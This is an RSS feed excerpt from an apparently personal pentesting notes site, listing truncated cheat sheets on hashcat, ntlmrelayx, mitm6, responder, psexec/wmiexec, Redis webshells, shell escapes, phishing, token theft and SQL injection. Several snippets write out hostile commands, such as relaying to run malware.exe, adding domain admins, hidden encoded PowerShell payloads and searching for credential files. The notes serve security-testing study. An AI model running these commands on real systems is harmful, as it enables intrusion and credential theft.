50 65 72 64 6f 6b 27 73 20 73 70 6f 6f 72 7a 6f 65 6b 65 72 20 21 54 68 69 6e 67 73 20 61 72 65 20 6e 6f 74 20 61 73 20 74 68 65 79 20 73 65 65 6d 2c 20 73 6f 20 49 20 77 69 6c 6c 20 62 72 69 6e 67 20 79 6f 75 20 75 70 20 74 6f 20 73 70 65 65 64 2e 0a 4d 69 72 72 6f 72 20 74 68 65 20 42 61 73 65 20 61 6e 64 20 79 6f 75 20 77 69 6c 6c 20 73 75 63 63 65 65 64 2e 20 Perdok's spoorzoeker !</description></item><item><title>encrypted password protected zip</title><link>https://notes.justin-p.me/notes/methodology/general/crack-password-protected-zip/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/crack-password-protected-zip/</guid><description>encrypted password protected zip During your work you might stumble upon an password protected zip. It&amp;rsquo;s possible to extract a password hash that can be cracked with hashcat/john.
zip2john extract zip hash
zip2john crackme.zip &amp;gt; crackeziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254 hashcat format remove zipfilename
zip2john crackme.zip | cut -d &amp;quot;:&amp;quot; -f 2 &amp;gt; ziphash.txt ver 2.0 efh 5455 efh 7875 crackme.</description></item><item><title>hashcat</title><link>https://notes.justin-p.me/cheatsheets/tools/hashcat/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/hashcat/</guid><description>hashcat Installation git clone https://github.com/hashcat/hashcat.git cd hashcat make sudo make install nvidea drivers
apt install nvidia-cuda-toolkit Usage hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]... Flags Options Short / Long | Type | Description | Example ================================+======+======================================================+======================= -m, --hash-type | Num | Hash-type, see references below | -m 1000 -a, --attack-mode | Num | Attack-mode, see references below | -a 3 -V, --version | | Print version | -h, --help | | Print help | --quiet | | Suppress output | --hex-charset | | Assume charset is given in hex | --hex-salt | | Assume salt is given in hex | --hex-wordlist | | Assume words in wordlist are given in hex | --force | | Ignore warnings | --status | | Enable automatic update of the status screen | --status-json | | Enable JSON format for status ouput | --status-timer | Num | Sets seconds between status screen updates to X | --status-timer=1 --stdin-timeout-abort | Num | Abort if there is no input from stdin for X seconds | --stdin-timeout-abort=300 --machine-readable | | Display the status view in a machine-readable format | --keep-guessing | | Keep guessing the hash after it has been cracked | --self-test-disable | | Disable self-test functionality on startup | --loopback | | Add new plains to induct directory | --markov-hcstat2 | File | Specify hcstat2 file to use | --markov-hcstat2=my.</description></item><item><title>IPv6 DNS Takeover</title><link>https://notes.justin-p.me/notes/methodology/internal/active-directory/ipv6-dns-takeover/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/active-directory/ipv6-dns-takeover/</guid><description>IPv6 DNS Takeover Windows prefers IPv6 over IPv4. This enables us to perform a DNS takeover using mitm6 if IPv6 is not already in use in the network. When this attack is performed, it is also possible to make computer accounts and users authenticate to us over HTTP by spoofing the WPAD location and requesting authentication to use our rogue proxy.
Attacking Combine with mitm6 + ntlmrelayx + (getSP.py + ) secretsdump.</description></item><item><title>msfvenom</title><link>https://notes.justin-p.me/cheatsheets/tools/msfvenom/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/msfvenom/</guid><description>msfvenom Installation Install metasploit.
Usage msfvenom [options] &amp;lt;var=val&amp;gt; Flags -l, --list &amp;lt;type&amp;gt; List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all -p, --payload &amp;lt;payload&amp;gt; Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom --list-options List --payload &amp;lt;value&amp;gt;'s standard, advanced and evasion options -f, --format &amp;lt;format&amp;gt; Output format (use --list formats to list) -e, --encoder &amp;lt;encoder&amp;gt; The encoder to use (use --list encoders to list) --service-name &amp;lt;value&amp;gt; The service name to use when generating a service binary --sec-name &amp;lt;value&amp;gt; The new section name to use when generating large Windows binaries.</description></item><item><title>ntlmrelayx</title><link>https://notes.justin-p.me/cheatsheets/tools/ntlmrelayx/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/ntlmrelayx/</guid><description>ntlmrelayx Relay to Workstations other Clients dump SAM ntlmrelayx.py -tf targets.txt -smb2support
interactive session ntlmrelayx.py -tf targets.txt -smb2support -i
Execute a file ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe
Execute a command ntlmrelayx.py -tf targets.txt -smb2support -c &amp;quot;whoami&amp;quot;
Relay to AD with LDAP Basic command This command will:
dump LDAP information if credentials allow it add a Domain Admin account (user is added to Enterprise Admins group) setup a &amp;lsquo;domain user&amp;rsquo; account with ACL rights to preform a DCsync.</description></item><item><title>priv esc</title><link>https://notes.justin-p.me/notes/methodology/general/priv-esc/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/priv-esc/</guid><description>priv esc Just because you pop&amp;rsquo;ed a shell doenst mean its game over. Sometimes you find your self in a low privilage process and in order to compromise the host fully you would need to escalate your privileges
Checklists g0tmi1k Linux Privilege Escalation hacktricks Linux Privilege Escalation fuzzysecurity Windows Privilege Escalation PowerSploit - PowerUp PayloadAllTheThings Scripts linPEAS winPEAS linenum MSF - local_exploit_suggester AonCyberLabs/Windows-Exploit-Suggester jondonas/linux-exploit-suggester-2 RastaMouse/Sherlock `powershell &amp;ldquo;IEX(New-Object Net.</description></item><item><title>psexec</title><link>https://notes.justin-p.me/cheatsheets/tools/psexec/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/psexec/</guid><description>psexec MSFConsole exploit/windows/smb/psexec
PSExec.py psexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
alternatives smbexec smbexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
wmiexec Example 1 wmiexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
Example 2 wmiexec.py lab.justin-p.me/dwalker@10.11.12.101 'powershell -exec bypass -Noninteractive -windowstyle hidden -e 'PAYLOAD' -hashes a:hash</description></item><item><title>public key disclosure</title><link>https://notes.justin-p.me/notes/methodology/external/recon/public-key-disclosure/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/public-key-disclosure/</guid><description>public key disclosure Very often keys are pushed to code repositories such as Github, Bitbucket or Gitlab. You want to identify a target code repo and search all commit history to discover secrets that might have been pushed.
Tools to search git repos
gitleaks # MOVE TO OWN TOOLS PAGE
gitrob # MOVE TO OWN TOOLS PAGE
truffleHog # MOVE TO OWN TOOLS PAGE</description></item><item><title>responder</title><link>https://notes.justin-p.me/cheatsheets/tools/responder/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/responder/</guid><description>responder Basic usage run responder on eth0
responder -I eth0
Anaylise mode responder -I eth1 -A
Set and forget (silent for users) !!! likely break stuff on the network !!!
Verbose Enable answers for netbios wredir suffix queries. Enable answers for netbios domain suffix queries. Start the WPAD rogue proxy server. Fingerprint a host that issued an NBT-NS or LLMNR query. responder -I eth1 -rdwfv
Set and forget (interactive) !</description></item><item><title>shell escaping</title><link>https://notes.justin-p.me/notes/methodology/general/shell-escaping/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/shell-escaping/</guid><description>shell escaping Sometimes you find your self in a locked down/pseudo shell, for example some network appliance. But under the hood it might run a full unix OS. If this is the case you might be able to use some existing programs that might be available to escape from this pseudo shell.
editors vim :!/bin/sh :set shell=/bin/sh :shell ed !'/bin/sh' ne Load Prefs nano CTRL+R CTRL+X reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0 Pager More/Less Open a file that is larger then your terminal.</description></item><item><title>SMB Relay</title><link>https://notes.justin-p.me/notes/methodology/internal/active-directory/smb-relay/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/active-directory/smb-relay/</guid><description>SMB Relay Use a captures hash to authenticated against a PC.
SMB signing has to be disabled. (nmap &amp;ndash;script smb2-security-mode.nse -p 445 CIDR/HOST) User credentials must have remote login access Attacking Setup responder to not start a SMB and HTTP server. (vim /usr/share/responder/Responder.conf)
responder + ntlmrelayx
Defences Enable SMB signing pro: fixes attack con: may cause slow down with file copies Disable NTLM auth. pro: fixes attack con: if kerberos goes down windows falls back to NTLM Account tiering.</description></item><item><title>WPAD</title><link>https://notes.justin-p.me/notes/methodology/internal/active-directory/wpad/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/active-directory/wpad/</guid><description>WPAD Windows can use a upstream proxy. To make configuring this proxy easier WPAD can be used. Web Proxy Auto-Discovery Protocol (WPAD) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS.
A attacker can serve a fake WPAD server and respond to client WPAD name resolutions. The client then requests the wpad.dat file from this fake WPAD Server. Responder creates an authentication screen and asks clients to enter the username and password they use in the domain.</description></item><item><title>Buffer Overflow</title><link>https://notes.justin-p.me/notes/methodology/general/buffer-overflow/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/buffer-overflow/</guid><description>Buffer Overflow This is mainly aimed at beginner/OCSP level BO.
Steps Crash The Application Spiking Fuzzing Find EIP Offset Control ESP Identify Bad Characters Find JMP ESP Generate Shell Code Exploit Definitions EIP The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command. ESP The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.</description></item><item><title>cloud-provider-web-servers</title><link>https://notes.justin-p.me/notes/methodology/external/postexploit/cloud-provider-web-servers/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/postexploit/cloud-provider-web-servers/</guid><description>Cloud provider web servers Cloud provider web servers have some special things you might not have on your &amp;rsquo;normal&amp;rsquo; webserver.
Azure windows webserver If you are able to compromise an azure server you might be able to use mimikatz to extract certificates and try to authenticitate to Azure with them.
crypto::capi privilege::debug crypto::cng crypto::certificates /systemstore:local_machine/store:my /export AWS Instance Metadata Cloud server hosted on services like EC2 need a way to orient themselves.</description></item><item><title>Hydra</title><link>https://notes.justin-p.me/cheatsheets/tools/hydra/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/hydra/</guid><description>Hydra Installation apt install apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev libmemcached-dev libgpg-error-dev libgcrypt11-dev libgcrypt20-dev git clone https://github.com/vanhauser-thc/thc-hydra cd thc-hydra ./configure make make install Usage hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]] Flags Flags
-R restore a previous aborted/crashed session -I ignore an existing restore file (don't wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type &amp;quot;-x -h&amp;quot; to get help -y disable use of symbols in bruteforce, see above -r use a non-random shuffling method for option -x -e nsr try &amp;quot;n&amp;quot; null password, &amp;quot;s&amp;quot; login as pass and/or &amp;quot;r&amp;quot; reversed login -u loop around users, not passwords (effective!</description></item><item><title>LLMNR and NBT-NS</title><link>https://notes.justin-p.me/notes/methodology/internal/active-directory/llmnr-and-nbt-ns/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/active-directory/llmnr-and-nbt-ns/</guid><description>LLMNR and NBT-NS By default when a DNS lookup fails windows tries to use 2 other components as a fallback. Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS). LLLMNR was introduced in Windows Vista and is the successor to NBT-NS.
These protocols help machines on the network identify hosts when DNS fails. So if one machine tries to resolve a particular host, but DNS resolution fails, the machine will then attempt to ask all other machines on the local network for the correct address via LLMNR or NBT-NS.</description></item><item><title>Misconfigured Cloud Assets</title><link>https://notes.justin-p.me/notes/methodology/external/misconfigured-cloud-assets/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/misconfigured-cloud-assets/</guid><description>Misconfigured Cloud Assets Misconfigurations are bound to happen. Now more then ever when more orgs are moving to the cloud, especially in COVID times. Administrators who have generally worked with onprem infrastructure now need to &amp;lsquo;quickly&amp;rsquo; setup services and migrate to the cloud. This can cause services to be incorrectly configured.
AWS Amazon Simple Storage Service (S3) Is secure by default. Can be made public. Nslookup can help reveal region.</description></item><item><title>mitm6</title><link>https://notes.justin-p.me/cheatsheets/tools/mitm6/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/mitm6/</guid><description>mitm6 Installation sudo pip3 install mitm6 Usage mitm6 [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS] [-m ADDRESS] [-a] [-v] [--debug] [-d DOMAIN] [-b DOMAIN] [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqdn] Flags optional arguments: -h, --help show this help message and exit -i INTERFACE, --interface INTERFACE Interface to use (default: autodetect) -l LOCALDOMAIN, --localdomain LOCALDOMAIN Domain name to use as DNS search domain (default: use first DNS domain) -4 ADDRESS, --ipv4 ADDRESS IPv4 address to send packets from (default: autodetect) -6 ADDRESS, --ipv6 ADDRESS IPv6 link-local address to send packets from (default: autodetect) -m ADDRESS, --mac ADDRESS Custom mac address - probably breaks stuff (default: mac of selected interface) -a, --no-ra Do not advertise ourselves (useful for networks which detect rogue Router Advertisements) -v, --verbose Show verbose information --debug Show debug information Filtering options: -d DOMAIN, --domain DOMAIN Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.</description></item><item><title>Password Spraying</title><link>https://notes.justin-p.me/notes/methodology/general/password-spraying/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/password-spraying/</guid><description>Password Spraying Once you have found several valid usernames/e-mail address you can try some common passwords with each of the discovered users. (Keep in mind the password and lockout policy of the environment, by default in Active Directory the minimum password length is 7 and lockout is 5.)
Microsoft Online MSOLSpray
Watch out for AzureAD Smart lockout. Use fireprox and/or the delay param.
Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user param -&amp;gt; set password -&amp;gt; Attacktype Sniper -&amp;gt; payload 1, user list -&amp;gt; run</description></item><item><title>Phising</title><link>https://notes.justin-p.me/notes/methodology/external/phising/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/phising/</guid><description>Phising Misconfigurations and vulnerable software are not the only way into a targets network. Phishing can be a very valuable wrench in your toolkit, its perfect to gather credentials, sessions or even shells.
Session Hijack Steal creds and/or session cookies. Can be useful when client has good prevention against shells.
Email a link to a target employee pointing to a cloned/proxied auth portal (Microsoft Online(O365, Azure), G-suite. AWS Console). When they auth they get a real session cookies, and so do we.</description></item><item><title>post compromise recon</title><link>https://notes.justin-p.me/notes/methodology/general/post-compermise-recon/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/post-compermise-recon/</guid><description>Post compromise recon Once you landed your self a shell or some credentials you need to ask your self a couple of questions.
Who do we have access as ? What roles do we have ? is MFA enabled ? What can we access ? Who are the admins and how are we going to escalate to one ? Are there any security protections in place ? Onprem infrastructure Active Directory BloodHound PowerView RSAT Cloud Infrastucture AWS Use recon_all module of wierd all to gather a lot of info about our current permissions.</description></item><item><title>Redis</title><link>https://notes.justin-p.me/notes/methodology/general/redis-exploitation/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/redis-exploitation/</guid><description>Redis If you can access a reddis instance there might be a couple of fun things you can do.
Webshell You must know the path of the Web site folder:
root@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379&amp;gt; config set dir /usr/share/nginx/html OK 10.85.0.52:6379&amp;gt; config set dbfilename redis.php OK 10.85.0.52:6379&amp;gt; set test &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; OK 10.85.0.52:6379&amp;gt; save OK SSH Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e &amp;ldquo;\n\n&amp;rdquo;; cat .</description></item><item><title>searchsploit</title><link>https://notes.justin-p.me/cheatsheets/tools/searchsploit/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/searchsploit/</guid><description>searchsploit Search searchsploit &amp;quot;Samba &amp;lt; 2.&amp;quot; show web url instead of local searchsploit -w &amp;quot;Samba &amp;lt; 2.&amp;quot; open exploit in editor searchsploit -x exploits/linux/remote/16321.rb copy exploit to current folder searchsploit -m exploits/linux/remote/16321.rb</description></item><item><title>showmount</title><link>https://notes.justin-p.me/cheatsheets/unix/showmount/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/showmount/</guid><description>showmount Usefull when nfs is open.
111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 40412/udp mountd | 100005 1,2,3 51233/tcp6 mountd | 100005 1,2,3 57722/tcp mountd | 100005 1,2,3 59004/udp6 mountd | 100021 1,3,4 37539/tcp6 nlockmgr | 100021 1,3,4 42654/udp nlockmgr | 100021 1,3,4 49656/udp6 nlockmgr | 100021 1,3,4 54775/tcp nlockmgr | 100024 1 38568/tcp status | 100024 1 50138/udp status | 100024 1 54698/udp6 status | 100024 1 57281/tcp6 status | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 2-3 (RPC #100227) showmount -e host</description></item><item><title>SQL Injection</title><link>https://notes.justin-p.me/notes/methodology/general/sql-injection/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/sql-injection/</guid><description>sql injection SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.
External stuff exploit-db ASCII table
Always True 1=1 a=a
Escape/stop mysql # -- #-- MySQL Verison select version()
information Schema Table names SELECT table_schema,table_name FROM information_Schema.tables SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.</description></item><item><title>steal access tokens</title><link>https://notes.justin-p.me/notes/methodology/internal/postexploit/steal-access-tokens/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/postexploit/steal-access-tokens/</guid><description>steal access tokens GCP Google JSON TOkens and credentials.db are saved to disk.
JSON tokens are typically used for service account access to GCP. They can be used to authenticate with gcloud and/or ScouteSuite.
if a user authenticates with gcloud from a compute instance their creds are stored here: ~/.config/gcloud/credentials.db
sudo find /home -name &amp;quot;credentials.db&amp;quot;
Azure Azure Cloud Service Packages (.cspkg) cspkg are deployment files created by Visual Studio. They offer possiablty to in intergrate to azure services such as SQL, Storage, etc.</description></item><item><title>Certificate Transparency Logs</title><link>https://notes.justin-p.me/notes/methodology/external/recon/certificate-transparency-logs/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/certificate-transparency-logs/</guid><description>Certificate Transparency Logs Certificate Transparency monitors and logs digital certs. This is publicly correlated in a searchable log. Using Certificate Transparency logs you may be able to find additional subdomains or other top level domains.
You could also search on a disclosed internal hostname from things such as e-mail headers and find the publicly accessible URL associated with this machine or other machines that share the internal domain (hostname01.domain.local, hostname02.domain.local) by looking at the x509v3 extension data.</description></item><item><title>Credential Gathering</title><link>https://notes.justin-p.me/notes/methodology/external/recon/credential-gathering/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/credential-gathering/</guid><description>Credential Gathering When you want to infiltrate an organization gaining some form of credentials will be key. One of the ways to gain these credentials is to search database and other form of leaks. A user might reuse his password on multiple accounts or use a specific pattern in their passwords.
External services Service info weleakinfo Data Breach Search Engine scylla.sh db dumps and more (Search Engine) hashes.</description></item><item><title>DNS Recon</title><link>https://notes.justin-p.me/notes/methodology/external/recon/dns-recon/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/dns-recon/</guid><description>DNS Recon When targeting an orgianization you want to know where their resources live. Apart from getting to know where their assets are most of the times these days there is a proxy infront of web applications that require the correct vhost (DNS hostname) to access them.
DNS Bruteforce Seclists has great wordlists for DNS bruteforce.
Try to find commonalities between domains and iterating names. Think about web01.domain.tld and web02.domain.tld, try web03,04,05 etc.</description></item><item><title>E-Mail Gathering</title><link>https://notes.justin-p.me/notes/methodology/external/recon/user-enumeration/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/user-enumeration/</guid><description>User enumeration When you want to infiltrate an organization gaining some form of credentials will be key. One of the ways to gain these credentials would be to preform brute-force techniques, such as password spraying. But in order to preform these you would first need to have a list of potential usernames. This is where user enumeration comes in.
Username schema If the target organisation is Microsoft based you will most likely be able to use 2 usernames for each account.</description></item><item><title>Google Dorking</title><link>https://notes.justin-p.me/notes/methodology/external/recon/google-dorking/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/google-dorking/</guid><description>Google Dorking Google dorks are search filters you can use in google. These allow you to find very specific sites (vendor/cms) or files.
External services Service info GHDB Google Hacking Database EXACT-MATCH Force an exact-match search. Use this to refine results for ambiguous searches, or to exclude synonyms when searching for single words.
&amp;quot;Dank memes&amp;quot; OR Search for X or Y.</description></item><item><title>Identify Technologies</title><link>https://notes.justin-p.me/notes/methodology/external/recon/identify-technologies/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/identify-technologies/</guid><description>Identify Technologies Being able to identity what you are targeting is critical if you want to succeed. This can range to what CMS a website is using, where a site is hosted, to what potential targets are &amp;lsquo;hidden&amp;rsquo; behind a ADFS server.
Netblocks blocks URL Azure Public https://www.microsoft.com/en-us/download/details.aspx?id=56519 Azure US Gov http://www.microsoft.com/en-us/download/details.aspx?id=57063 Azure Germany http://www.microsoft.com/en-us/download/details.aspx?id=57064 Azure China http://www.</description></item><item><title>Shodan</title><link>https://notes.justin-p.me/notes/methodology/external/recon/shodan/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/external/recon/shodan/</guid><description>Shodan Shodan is a search engine for Internet-connected devices. Web search engines, such as Google and Bing, are great for finding websites. But what if you&amp;rsquo;re interested in measuring which countries are becoming more connected? Or if you want to know which version of Microsoft IIS is the most popular? Or you want to find the control servers for malware? Maybe a new vulnerability came out and you want to see how many hosts it could affect?</description></item><item><title>smb</title><link>https://notes.justin-p.me/cheatsheets/tools/smbclient/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/smbclient/</guid><description>smbclient Examples list smbclient -L \\\\10.10.10.10\\ download all files smbclient \\\\10.10.10.10\\share mask &amp;quot;&amp;quot; recurse ON prompt OFF cd &amp;quot;path\to\remote\dir&amp;quot; lcd &amp;quot;~/path/to/download/to/&amp;quot; mget * protocol negotiation failed: NT_STATUS_IO_TIMEOUT Resolution: On Kali, edit /etc/samba/smb.conf Add the following under global: client min protocol = CORE client max protocol = SMB3</description></item><item><title>Web</title><link>https://notes.justin-p.me/notes/methodology/general/web/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/web/</guid><description>gobuster General scan ./go/bin/gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 40 -e Bigger wordlist and extensions gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e run trough burpsuite ~/go/bin/gobuster dir -u http://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e -p http://127.0.0.1:8080 kadimus LFI Scan &amp;amp; Exploit Tool (@hc0d3r - P0cL4bs Team)
general scan, through burp and save results kadimus -u http://192.168.56.103/?page=login --proxy http://127.0.0.1:8080 --output outputfile get file kadimus -u http://192.</description></item><item><title>base64</title><link>https://notes.justin-p.me/cheatsheets/unix/base64/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/base64/</guid><description>base64 Usage base64 [OPTION] [FILE] Flags -w, --wrap=COLS Wrap encoded lines after COLS character (default 76). Use 0 to disable line wrapping. -d, --decode Decode data. -i, --ignore-garbage When decoding, ignore non-alphabet characters. --help display this help and exit --version output version information and exit Examples Encode echo EncodeMe | base64 -e Decode echo RW5jb2RlTWU= | base64 -d Encode file base64 file1 &amp;gt; encodedfile1 Decode file base64 -d encodedfile1 &amp;gt; file1 Also see N/A</description></item><item><title>bzip2</title><link>https://notes.justin-p.me/cheatsheets/unix/bzip2/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/bzip2/</guid><description>bzip2 Usage bzip2 [OPTIONS] [FILE] Flags -c --stdout Compress or decompress to standard output. -d --decompress Force decompression. bzip2, bunzip2 and bzcat are really the same program, and the decision about what actions to take is done on the basis of which name is used. This flag overrides that mechanism, and forces bzip2 to decompress. -z --compress The complement to -d: forces compression, regardless of the invocation name. -t --test Check integrity of the specified file(s), but dont decompress them.</description></item><item><title>cron</title><link>https://notes.justin-p.me/cheatsheets/unix/cron/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/cron/</guid><description>cron Usage Min Hour Day Mon Weekday Command * * * * * command to be executed â”¬ â”¬ â”¬ â”¬ â”¬ â”‚ â”‚ â”‚ â”‚ â””â”€ Weekday (0=Sun .. 6=Sat) â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€ Month (1..12) â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Day (1..31) â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Hour (0..23) â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0..59) Examples Example Description 0 * * * * every hour */15 * * * * every 15 mins 0 */2 * * * every 2 hours 0 0 * * 0 every Sunday midnight @reboot every reboot Crontab Adding tasks easily echo &amp;quot;@reboot echo hi&amp;quot; | crontab Open in editor crontab -e List tasks crontab -l [-u user] Also see N/A</description></item><item><title>dash in file name</title><link>https://notes.justin-p.me/notes/random/dash_in_file_name/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/notes/random/dash_in_file_name/</guid><description>Usage of dash (-) in place of a filename Using - as a filename to mean stdin/stdout is a convention that a lot of programs use. It is not a special property of the filename. The kernel does not recognize - as special so any system calls referring to - as a filename will use - literally as the filename.
With bash redirection, - is not recognized as a special filename, so bash will use that as the literal filename.</description></item><item><title>md5sum</title><link>https://notes.justin-p.me/cheatsheets/unix/md5sum/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/md5sum/</guid><description>md5sum Usage md5sum [OPTIONS] [FILE] Flags -b, --binary read in binary mode -c, --check read MD5 sums from the FILEs and check them --tag create a BSD-style checksum -t, --text read in text mode (default) -z, --zero end each output line with NUL, not newline, and disable file name escaping The following five options are useful only when verifying checksums: --ignore-missing dont fail or report status for missing files --quiet dont print OK for each successfully verified file --status dont output anything, status code shows success --strict exit non-zero for improperly formatted checksum lines -w, --warn warn about improperly formatted checksum lines --help display this help and exit --version output version information and exit Examples display the hash value md5sum file1 validate multiple files md5sum file1 